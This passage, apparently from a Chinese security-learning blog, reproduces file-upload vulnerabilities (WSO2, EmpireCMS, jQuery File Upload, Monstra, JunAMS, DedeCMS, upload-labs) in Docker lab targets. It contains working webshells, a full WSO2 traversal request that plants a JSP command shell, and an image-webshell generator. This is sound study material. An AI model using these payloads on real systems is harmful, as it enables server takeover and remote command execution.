+<h4 id="漏洞环境-4"><a href="#漏洞环境-4" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/dedecms-cve_2019_8933:latest</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>dedecms<span class="token operator">-</span>cve_2019_8933<span class="token punctuation">:</span>latest
+
+docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8081</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>dedecms<span class="token operator">-</span>cve_2019_8933<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>后台路径：/uploads/dede/ 后台密码：admin:admin</p>
+<p>模板=&gt;默认模板管理=&gt;新建模板</p>
+<p><img src="/2023/01221/93.png" alt="93"></p>
+<p>在新建模板中写入一句话木马，并保存最为.htm格式</p>
+<p>之后进行一下操作：</p>
+<p><img src="/2023/01221/94.png" alt="94"></p>
+<p>即上传完成，可以点击浏览查看效果，之后可以使用webshell工具进行连接。</p>
+<h3 id="CVE-2020-13384-Monstra文件上传"><a href="#CVE-2020-13384-Monstra文件上传" class="headerlink" title="CVE-2020-13384 Monstra文件上传"></a>CVE-2020-13384 Monstra文件上传</h3><h4 id="漏洞环境-5"><a href="#漏洞环境-5" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/monstra_cve_2020_13384:latest</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>monstra_cve_2020_13384<span class="token punctuation">:</span>latest
+
+docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>monstra_cve_2020_13384<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ol>
+<li><p>初始化环境</p>
+</li>
+<li><p>登录管理员页面，找到文件上传页面</p>
+</li>
+</ol>
+<p>​    <a href="http://ip:端口号/admin/index.php?id=filesmanager(我的文件上传地址)">http://ip:端口号/admin/index.php?id=filesmanager(我的文件上传地址)</a></p>
+<ol start="3">
+<li>准备一个php木马文件，选择并上传</li>
+<li>点击上传时，提示文件类型不允许上传</li>
+<li>多次测试文件扩展名，最终确定 .phar 可以上传</li>
+<li>上传 phar的php木马</li>
+<li>访问该文件，文件上传成功</li>
+</ol>
+<p>​    <a href="http://ip:端口号/public/uploads/a.phar">http://ip:端口号/public/uploads/a.phar</a></p>
+<ol start="8">
+<li>将文件内容修改为一句话木马，即可使用Webshell管理工具进行管理</li>
+</ol>
+<p><strong>如何批量测试扩展名是否不在黑名单内？</strong></p>
+<p>​    抓上传页面的包，之后把包放入Inturder,之后选中扩展名进行爆破即可</p>
+<p><img src="/2023/01221/95.PNG" alt="95"></p>
+<p><strong>推荐扩展名爆破脚本</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts"> Fuzz 字典</a></p>
+<h3 id="CVE-2018-9207-jQuery文件上传"><a href="#CVE-2018-9207-jQuery文件上传" class="headerlink" title="CVE-2018-9207 jQuery文件上传"></a>CVE-2018-9207 jQuery文件上传</h3><h4 id="漏洞环境-6"><a href="#漏洞环境-6" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/jquery-cve_2018_9207:latest</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>jquery<span class="token operator">-</span>cve_2018_9207<span class="token punctuation">:</span>latest
+
+docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>jquery<span class="token operator">-</span>cve_2018_9207<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ol>
+<li>准备一个php木马</li>
+</ol>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> #命名为shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="2">
+<li>上传</li>
+</ol>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">curl <span class="token operator">-</span><span class="token constant">F</span> <span class="token string double-quoted-string">"myfile=@shell.php"</span> <span class="token string double-quoted-string">"http://ip:8080/jquery-upload-file/php/upload.php"</span> <span class="token comment">#命令行上传即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="3">
+<li>验证木马</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="http://ip:8080/jquery-upload-file/php/upload/shell.php">http://ip:8080/jquery-upload-file/php/upload/shell.php</a></p>
+<h3 id="CVE-2022-29464-WSO2-文件上传-未成功"><a href="#CVE-2022-29464-WSO2-文件上传-未成功" class="headerlink" title="CVE-2022-29464 WSO2 文件上传(未成功)"></a>CVE-2022-29464 WSO2 文件上传(未成功)</h3><p>WSO2是一家成立于 2005 年的开源技术提供商。它提供了一个企业平台，用于在本地和整个 Internet 上 集成应用程序编程接口(API)、应用程序和 Web 服务。</p>
+<p>某些 WSO2 产品允许无限制的文件上传和远程代码执行。</p>
+<h4 id="漏洞环境-7"><a href="#漏洞环境-7" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/jquery-cve_2018_9207:latest</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>wso2<span class="token operator">-</span>cve_2022_29464<span class="token punctuation">:</span>latest
+
+docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">9443</span><span class="token punctuation">:</span><span class="token number">9443</span> vulfocus<span class="token operator">/</span>wso2<span class="token operator">-</span>cve_2022_29464<span class="token punctuation">:</span>latest
+
+<span class="token comment"># https://ip:9443</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>漏洞复现</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lwh01/p/16193991.html">https://www.cnblogs.com/lwh01/p/16193991.html</a></p>
+<ol>
+<li><p>访问链接 <a target="_blank" rel="noopener" href="https://ip:9443/">https://ip:9443</a></p>
+</li>
+<li><p>构造以下数据包Poc</p>
+</li>
+</ol>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>fileupload<span class="token operator">/</span>toolsAny HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> ip<span class="token punctuation">:</span><span class="token number">9443</span>
+Accept<span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span>
+Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">889</span>
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>4ef9f369a86bfaadf5ec3177278d49c0
+User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> python<span class="token operator">-</span>requests<span class="token operator">/</span><span class="token number">2.22</span><span class="token number">.0</span>
+<span class="token operator">-</span><span class="token operator">-</span>4ef9f369a86bfaadf5ec3177278d49c0
+Content<span class="token operator">-</span>Disposition<span class="token punctuation">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> 
+name<span class="token operator">=</span>"<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>repository<span class="token operator">/</span>deployment<span class="token operator">/</span>server<span class="token operator">/</span>webapps<span class="token operator">/</span>authenticationendpoint<span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">.</span>
+jsp"<span class="token punctuation">;</span> 
+filename<span class="token operator">=</span>"<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>repository<span class="token operator">/</span>deployment<span class="token operator">/</span>server<span class="token operator">/</span>webapps<span class="token operator">/</span>authenticationendpoin
+t<span class="token operator">/</span><span class="token number">1.</span>jsp"
+<span class="token operator">&lt;</span>FORM<span class="token operator">></span>
+   <span class="token operator">&lt;</span>INPUT name<span class="token operator">=</span><span class="token string">'cmd'</span> <span class="token builtin">type</span><span class="token operator">=</span>text<span class="token operator">></span>
+   <span class="token operator">&lt;</span>INPUT <span class="token builtin">type</span><span class="token operator">=</span>submit value<span class="token operator">=</span><span class="token string">'Run'</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>FORM<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.*"</span> <span class="token operator">%</span><span class="token operator">></span>
+   <span class="token operator">&lt;</span><span class="token operator">%</span>
+   String cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   String output <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+   <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+       String s <span class="token operator">=</span> null<span class="token punctuation">;</span>
+       <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+           Process p <span class="token operator">=</span> Runtime<span class="token punctuation">.</span>getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+           BufferedReader sI <span class="token operator">=</span> new BufferedReader<span class="token punctuation">(</span>new
+InputStreamReader<span class="token punctuation">(</span>p<span class="token punctuation">.</span>getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+           <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">=</span> sI<span class="token punctuation">.</span>readLine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> output <span class="token operator">+=</span> s<span class="token operator">+</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+       <span class="token punctuation">&#125;</span> catch<span class="token punctuation">(</span>IOException e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   e<span class="token punctuation">.</span>printStackTrace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>
+   <span class="token punctuation">&#125;</span>
+<span class="token operator">%</span><span class="token operator">></span>
+       <span class="token operator">&lt;</span>pre<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%=</span>output <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>pre<span class="token operator">></span>
+<span class="token operator">-</span><span class="token operator">-</span>4ef9f369a86bfaadf5ec3177278d49c0<span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="3">
+<li>发送数据包</li>
+</ol>
+<p><img src="/2023/01221/96.PNG" alt="96"></p>
+<ol start="4">
+<li>验证</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://ip:9443/authenticationendpoint/1.jsp?cmd=ls">https://ip:9443/authenticationendpoint/1.jsp?cmd=ls</a></p>
+<p><img src="/2023/01221/97.PNG" alt="97"></p>
+<p>上传成功木马文件，可执行Linux命令</p>
+<h3 id="CVE-2018-18086-EmpireCMS文件上传"><a href="#CVE-2018-18086-EmpireCMS文件上传" class="headerlink" title="CVE-2018-18086 EmpireCMS文件上传"></a>CVE-2018-18086 EmpireCMS文件上传</h3><p>EmpireCMS（帝国网站管理系统）是一套内容管理系统（CMS）。</p>
+<p>EmpireCMS 7.5版本中的e/class/moddofun.php文件的‘LoadInMod’函数存在安全漏洞。攻击者可利用该漏洞上传任意文件。</p>
+<h4 id="漏洞环境-8"><a href="#漏洞环境-8" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/empirecms-cve_2018_18086:latest</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>empirecms<span class="token operator">-</span>cve_2018_18086<span class="token punctuation">:</span>latest
+
+docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>empirecms<span class="token operator">-</span>cve_2018_18086<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ol>
+<li><p>进入靶场，登入后台 <a target="_blank" rel="noopener" href="http://ip:8080/empirecms/e/admin/">http://ip:8080/empirecms/e/admin/</a> 账号/密码:admin/123456。</p>
+</li>
+<li><p>系统-&gt;管理数据表-&gt;导入系统模型</p>
+</li>
+</ol>
+<ol start="3">
+<li>上传*.php.mod文件，填写空白内容，选择马上导入，并确认：</li>
+</ol>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sh3ll.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php @eval(\$_POST['1']); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/01221/98.PNG" alt="98"></p>
+<p><img src="/2023/01221/99.PNG" alt="99"></p>
+<p>存放的数据表名可以是任意的</p>
+<ol start="4">
+<li><p>生成的sh3ll文件在admin目录下。</p>
+<p>蚁剑连接<a target="_blank" rel="noopener" href="http://ip:8080/empirecms/e/admin/sh3ll.php">http://ip:8080/empirecms/e/admin/sh3ll.php</a> 密码1。</p>
+</li>
+</ol>
+<h3 id="CNVD-2020-24741-JunAMS文件上传"><a href="#CNVD-2020-24741-JunAMS文件上传" class="headerlink" title="CNVD-2020-24741 JunAMS文件上传"></a>CNVD-2020-24741 JunAMS文件上传</h3><p>JunAMS是一款以ThinkPHP为框架的开源内容管理系统。</p>
+<p>JunAMS内容管理系统存在文件上传漏洞，攻击者可利用该漏洞上传webshell，获取服务器权限。</p>
+<h4 id="漏洞环境-9"><a href="#漏洞环境-9" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/junams-cnvd_2020_24741:latest</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>junams<span class="token operator">-</span>cnvd_2020_24741<span class="token punctuation">:</span>latest
+
+docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>junams<span class="token operator">-</span>cnvd_2020_24741<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>漏洞复现</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48985780/article/details/122240823">https://blog.csdn.net/qq_48985780/article/details/122240823</a></p>
+<ol>
+<li>访问管理员页面</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="http://ip/admin.php">http://ip/admin.php</a></p>
+<p>admin admin</p>
+<ol start="2">
+<li>构造文件上传表单</li>
+</ol>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span>
+<span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://ip/admin.php/common/add_images.html<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>F12–&gt;元素–&gt;右键body元素–&gt;编辑html元素</p>
+<p>3、上传任意php文件</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php @<span class="token builtin">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="4">
+<li><p>验证木马</p>
+<p>访问：<a href="http://ip:port/public/edit/20220511/1cee34ac8a7d46db3c7ff51b8b502439.php">http://ip:port/public/edit/20220511/1cee34ac8a7d46db3c7ff51b8b502439.php</a></p>
+</li>
+</ol>
+<h3 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/05a410f3f3e0">https://www.jianshu.com/p/05a410f3f3e0</a></p>
+<h4 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h4><p>二次渲染绕过</p>
+<p>1、制作一张防止二次渲染的图片马</p>
+<p>img.php</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php
+$p <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>
+           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>
+           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>
+           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>
+           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>
+           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>
+           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>
+           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+$img <span class="token operator">=</span> imagecreatetruecolor<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span>$y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> $y <span class="token operator">&lt;</span> sizeof<span class="token punctuation">(</span>$p<span class="token punctuation">)</span><span class="token punctuation">;</span> $y <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   $r <span class="token operator">=</span> $p<span class="token punctuation">[</span>$y<span class="token punctuation">]</span><span class="token punctuation">;</span>
+   $g <span class="token operator">=</span> $p<span class="token punctuation">[</span>$y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+   $b <span class="token operator">=</span> $p<span class="token punctuation">[</span>$y<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+   $color <span class="token operator">=</span> imagecolorallocate<span class="token punctuation">(</span>$img<span class="token punctuation">,</span> $r<span class="token punctuation">,</span> $g<span class="token punctuation">,</span> $b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   imagesetpixel<span class="token punctuation">(</span>$img<span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span>$y <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $color<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+imagepng<span class="token punctuation">(</span>$img<span class="token punctuation">,</span><span class="token string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>2、将图片上传</p>
+<p>3、使用文件包含的方式利用</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/upload/include.php?file=upload/21953.png&amp;0=assert">http://127.0.0.1/upload/include.php?file=upload/21953.png&amp;0=assert</a></p>
+<p>POST： 1=system(‘whoami’);</p>
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>文件包含：程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p>
+<p>开发人员没有对要包含的文件进行安全检验，导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
+<h4 id="包含演示"><a href="#包含演示" class="headerlink" title="包含演示"></a>包含演示</h4><p>index.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>test.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="包含脚本"><a href="#包含脚本" class="headerlink" title="包含脚本"></a>包含脚本</h3><p>php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 使用该函数包含文件</span>
+<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 功能与include()相同，但是当程序重复调用同一个文件时，只会调用</span>
+一次。
+<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// require和include(）类似，但是当require()调用的文件发生错误时，程</span>
+序会输出错误信息，并终止脚本的执行。
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// require()相同，但是当程序重复调用同一个文件时，只会调用一次。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>asp</p>
+<pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;!--#include file&#x3D;&quot;xxx.asp&quot;--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>aspx</p>
+<pre class="line-numbers language-aspx" data-language="aspx"><code class="language-aspx">&lt;!--#include file&#x3D;&quot;xxx.aspx&quot;--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>jsp</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ include file&#x3D;&quot;xxx.jsp&quot;%&gt;
+&lt;jsp:include page&#x3D;&quot;xxx.jsp&quot;&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
